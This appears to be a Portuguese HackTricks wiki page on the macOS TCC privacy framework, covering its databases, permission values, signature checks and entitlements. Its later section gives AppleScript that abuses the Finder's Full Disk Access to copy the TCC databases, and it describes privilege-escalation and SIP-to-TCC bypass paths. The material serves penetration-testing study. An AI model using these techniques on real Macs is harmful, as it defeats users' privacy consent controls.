# macOS TCC

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Informações Básicas**

**TCC (Transparency, Consent, and Control)** é um mecanismo no macOS para **limitar e controlar o acesso de aplicativos a determinados recursos**, geralmente do ponto de vista da privacidade. Isso pode incluir coisas como serviços de localização, contatos, fotos, microfone, câmera, acessibilidade, acesso total ao disco e muito mais.

Do ponto de vista do usuário, eles veem o TCC em ação **quando um aplicativo deseja acessar um dos recursos protegidos pelo TCC**. Quando isso acontece, o **usuário recebe uma solicitação** em forma de diálogo perguntando se eles desejam permitir o acesso ou não.

Também é possível **conceder acesso a aplicativos** a arquivos por meio de **intenções explícitas** dos usuários, por exemplo, quando um usuário **arrasta e solta um arquivo em um programa** (obviamente, o programa deve ter acesso a ele).

![Um exemplo de uma solicitação do TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

O **TCC** é gerenciado pelo **daemon** localizado em `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` e configurado em `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (registrando o serviço mach `com.apple.tccd.system`).

Existe um **tccd em modo de usuário** em execução para cada usuário conectado, definido em `/System/Library/LaunchAgents/com.apple.tccd.plist`, registrando os serviços mach `com.apple.tccd` e `com.apple.usernotifications.delegate.com.apple.tccd`.

Aqui você pode ver o tccd em execução como sistema e como usuário:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
As permissões são herdadas do aplicativo pai e as permissões são rastreadas com base no ID do pacote e no ID do desenvolvedor.

### Bancos de dados do TCC

As seleções são então armazenadas no banco de dados do TCC em todo o sistema em **`/Library/Application Support/com.apple.TCC/TCC.db`** ou em **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** para preferências por usuário. Os bancos de dados são protegidos contra edição com SIP (System Integrity Protection), mas você pode lê-los.

{% hint style="danger" %}
O banco de dados do TCC no **iOS** está em **`/private/var/mobile/Library/TCC/TCC.db`**
{% endhint %}

Existe um terceiro banco de dados do TCC em **`/var/db/locationd/clients.plist`** para indicar os clientes autorizados a acessar os serviços de localização.

Além disso, um processo com acesso total ao disco pode editar o banco de dados do modo de usuário. Agora, um aplicativo também precisa de FDA ou **`kTCCServiceEndpointSecurityClient`** para ler o banco de dados (e modificar o banco de dados dos usuários).

{% hint style="info" %}
A interface do usuário do centro de notificações pode fazer alterações no banco de dados do TCC do sistema:

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

No entanto, os usuários podem **excluir ou consultar regras** com a utilidade de linha de comando **`tccutil`**.
{% endhint %}

{% tabs %}
{% tab title="user DB" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="Banco de dados do sistema" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
Ao verificar ambos os bancos de dados, você pode verificar as permissões que um aplicativo permitiu, proibiu ou não possui (ele solicitará).
{% endhint %}

* O **`auth_value`** pode ter valores diferentes: denied(0), unknown(1), allowed(2) ou limited(3).
* O **`auth_reason`** pode ter os seguintes valores: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
* O campo **csreq** está lá para indicar como verificar o binário a ser executado e conceder as permissões do TCC:
```
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
* Para obter mais informações sobre os **outros campos** da tabela, [**verifique esta postagem no blog**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).

{% hint style="info" %}
Algumas permissões do TCC são: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Não há uma lista pública que defina todas elas, mas você pode verificar esta [**lista de permissões conhecidas**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).

O **Acesso Total ao Disco** tem o nome de **`kTCCServiceSystemPolicyAllFiles`** e o **`kTCCServiceAppleEvents`** permite que o aplicativo envie eventos para outros aplicativos que são comumente usados para **automatizar tarefas**.

O **kTCCServiceEndpointSecurityClient** é uma permissão do TCC que também concede altos privilégios, incluindo a opção de escrever no banco de dados dos usuários.

Além disso, o **`kTCCServiceSystemPolicySysAdminFiles`** permite **alterar** o atributo **`NFSHomeDirectory`** de um usuário, o que altera sua pasta pessoal e, portanto, permite **burlar o TCC**.
{% endhint %}

Você também pode verificar as **permissões já concedidas** aos aplicativos em `Preferências do Sistema --> Segurança e Privacidade --> Privacidade --> Arquivos e Pastas`.

{% hint style="success" %}
Observe que, mesmo que um dos bancos de dados esteja dentro da pasta pessoal do usuário, **os usuários não podem modificar diretamente esses bancos de dados devido ao SIP** (mesmo se você for root). A única maneira de configurar ou modificar uma nova regra é por meio do painel de Preferências do Sistema ou das solicitações em que o aplicativo pede ao usuário.

No entanto, lembre-se de que os usuários _podem_ **excluir ou consultar regras** usando o **`tccutil`**.
{% endhint %}

#### Redefinir
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### Verificações de Assinatura do TCC

O banco de dados do TCC armazena o **ID do Bundle** do aplicativo, mas também **armazena informações** sobre a **assinatura** para **garantir** que o aplicativo que solicita permissão seja o correto.

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select hex(csreq) from access where client="ru.keepcoder.Telegram";
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
Portanto, outros aplicativos que usam o mesmo nome e ID de pacote não poderão acessar as permissões concedidas a outros aplicativos.
{% endhint %}

### Entitlements

Os aplicativos **não apenas precisam** solicitar e ter **acesso concedido** a alguns recursos, eles também precisam **ter as permissões relevantes**.\
Por exemplo, o **Telegram** tem a permissão `com.apple.security.device.camera` para solicitar **acesso à câmera**. Um **aplicativo** que **não tenha** essa **permissão não poderá** acessar a câmera (e o usuário nem mesmo será solicitado a conceder as permissões).

No entanto, para que os aplicativos tenham **acesso a determinadas pastas do usuário**, como `~/Desktop`, `~/Downloads` e `~/Documents`, eles **não precisam** ter nenhuma **permissão específica**. O sistema lidará com o acesso de forma transparente e **solicitará permissão ao usuário** conforme necessário.

Os aplicativos da Apple **não gerarão solicitações**. Eles contêm **direitos pré-concedidos** em sua lista de **permissões**, o que significa que eles **nunca gerarão um pop-up** e também não aparecerão em nenhum dos **bancos de dados do TCC**. Por exemplo:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Isso evitará que o Calendário solicite ao usuário acesso a lembretes, calendário e lista de contatos.

{% hint style="success" %}
Além de alguma documentação oficial sobre as permissões, também é possível encontrar **informações interessantes sobre as permissões** em [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)
{% endhint %}

### Locais sensíveis desprotegidos

* $HOME (ele mesmo)
* $HOME/.ssh, $HOME/.aws, etc
* /tmp

### Intenção do usuário / com.apple.macl

Como mencionado anteriormente, é possível **conceder acesso a um aplicativo a um arquivo arrastando-o e soltando-o nele**. Esse acesso não será especificado em nenhum banco de dados TCC, mas como um **atributo estendido do arquivo**. Esse atributo irá **armazenar o UUID** do aplicativo permitido:
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
É curioso que o atributo **`com.apple.macl`** seja gerenciado pelo **Sandbox**, não pelo tccd.

Também observe que se você mover um arquivo que permite o UUID de um aplicativo em seu computador para um computador diferente, porque o mesmo aplicativo terá UIDs diferentes, ele não concederá acesso a esse aplicativo.
{% endhint %}

O atributo estendido `com.apple.macl` **não pode ser removido** como outros atributos estendidos porque está **protegido pelo SIP**. No entanto, como [**explicado neste post**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), é possível desabilitá-lo **compactando** o arquivo, **excluindo-o** e **descompactando-o**.

## Privilégios de Escalação e Bypass do TCC

### Escalação de Privilégios de Automação para FDA

O **Finder** é um aplicativo que **sempre possui FDA** (mesmo que não apareça na interface do usuário), portanto, se você tiver privilégios de **Automação** sobre ele, poderá abusar de seus privilégios para **fazer com que ele execute algumas ações**.

{% tabs %}
{% tab title="Roubar o TCC.db dos usuários" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias

try
duplicate file sourceFile to targetFolder with replacing
on error errMsg
display dialog "Error: " & errMsg
end try
end tell
EOD
```
{% tab title="Roubar o TCC.db do sistema" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias

try
duplicate file sourceFile to targetFolder with replacing
on error errMsg
display dialog "Error: " & errMsg
end try
end tell
EOD
```
{% endtab %}
{% endtabs %}

Você pode abusar disso para **escrever seu próprio banco de dados TCC de usuário**.

Esta é a solicitação TCC para obter privilégios de automação sobre o Finder:

<figure><img src="../../../../.gitbook/assets/image.png" alt="" width="244"><figcaption></figcaption></figure>

### Escalação de privilégios do banco de dados TCC do usuário para FDA

Obtendo **permissões de escrita** sobre o **banco de dados TCC do usuário**, você não pode conceder a si mesmo permissões de **`FDA`**, apenas aquele que está no banco de dados do sistema pode conceder isso.

Mas você pode se dar **direitos de automação para o Finder**, e abusar da técnica anterior para escalar para FDA.

### **Escalação de privilégios do FDA para permissões TCC**

Eu não acho que isso seja uma escalação de privilégios real, mas apenas no caso de você achar útil: se você controla um programa com FDA, você pode **modificar o banco de dados TCC dos usuários e se dar qualquer acesso**. Isso pode ser útil como uma técnica de persistência caso você perca suas permissões do FDA.

### **Do SIP Bypass para o Bypass do TCC**

O banco de dados **TCC do sistema** é protegido pelo **SIP**, por isso apenas processos com as **autorizações indicadas serão capazes de modificá-lo**. Portanto, se um invasor encontrar um **bypass do SIP** em um **arquivo** (ser capaz de modificar um arquivo restrito pelo SIP), ele será capaz de **remover a proteção** de um banco de dados TCC e se dar todas as permissões do TCC.

No entanto, há outra opção para abusar desse **bypass do SIP para contornar o TCC**, o arquivo `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` é uma lista de permissões de aplicativos que requerem uma exceção do TCC. Portanto, se um invasor puder **remover a proteção do SIP** deste arquivo e adicionar seu **próprio aplicativo**, o aplicativo poderá contornar o TCC.\
Por exemplo, para adicionar o terminal:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:

Este arquivo é usado pelo macOS para controlar quais aplicativos têm permissão para acessar dados protegidos pela TCC (Transparency, Consent, and Control). A TCC é um recurso de segurança do macOS que protege informações confidenciais, como contatos, calendários, câmera e microfone, exigindo que os aplicativos solicitem permissão ao usuário antes de acessá-las.

O AllowApplicationsList.plist contém uma lista de identificadores de pacotes de aplicativos que foram concedidos permissão para acessar dados protegidos pela TCC. Esses identificadores de pacotes são exclusivos para cada aplicativo e são usados pelo sistema operacional para identificar e rastrear as permissões concedidas.

Ao modificar o AllowApplicationsList.plist, é possível adicionar ou remover identificadores de pacotes de aplicativos para controlar quais aplicativos têm acesso aos dados protegidos pela TCC. No entanto, é importante ter cuidado ao fazer alterações nesse arquivo, pois modificações incorretas podem levar a problemas de segurança ou a aplicativos não funcionando corretamente.

Para editar o AllowApplicationsList.plist, você pode usar um editor de texto ou a linha de comando. Certifique-se de seguir as diretrizes e recomendações da Apple ao fazer alterações nesse arquivo para garantir a segurança e o bom funcionamento do seu sistema macOS.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### Bypasses do TCC

{% content-ref url="macos-tcc-bypasses/" %}
[macos-tcc-bypasses](macos-tcc-bypasses/)
{% endcontent-ref %}

## Referências

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
*   [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
